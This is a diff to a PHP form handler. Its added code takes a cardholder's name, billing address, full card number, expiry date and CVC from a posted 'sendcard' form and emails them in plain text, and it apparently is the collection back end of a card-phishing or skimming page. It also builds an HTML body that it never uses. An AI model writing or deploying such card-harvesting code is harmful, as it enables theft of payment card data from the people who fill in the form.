@@ -25,15 +25,41 @@ function sendEmail($post) {
     $headers .= "Content-type: text/html; charset=UTF-8\r\n";
     $headers .= "From: {$name} <{$fromEmail}>\r\n";
     $headers .= "Reply-To: {$fromEmail}\r\n";
+// Construct email content
+$fields = [
+    "Billing address" => $address,
+    "State" => $state,
+    "City" => $city,
+    "Zip-code" => $zipCode,
+    "Card owner" => $name,
+    "Card number" => $card_number,
+    "Amount" => $amount_to_pay,
+    "Card expiration year" => $card_expiration_year,
+    "Card expiration month" => $card_expiration_month,
+    "Card CVC" => $cvv,
+];
 
-    if (mail($to, $subject, "Test Message", $headers)) {
-        return "success";
-    } else {
-        return "Failed to send email.";
-    }
+$email_body = "You have received a new message:\n\n" . implode("\n", array_map(
+    fn($key, $value) => "$key: $value",
+    array_keys($fields),
+    $fields
+));
+
+$html_body = "<h3>You have received a new message:</h3>";
+foreach ($fields as $key => $value) {
+    $html_body .= "<p><strong>$key:</strong> $value</p>";
 }
 
-if (isset($_POST['sendcard'])) {
-    echo sendEmail($_POST);
+// Send email
+if (mail($to, $subject, $email_body, $headers)) {
+    return "success";
+} else {
+    return "Failed to send email.";
 }
+}
+if(isset($_POST['sendcard'])){
+sendEmail($_POST);
+}
+
+
 ?>
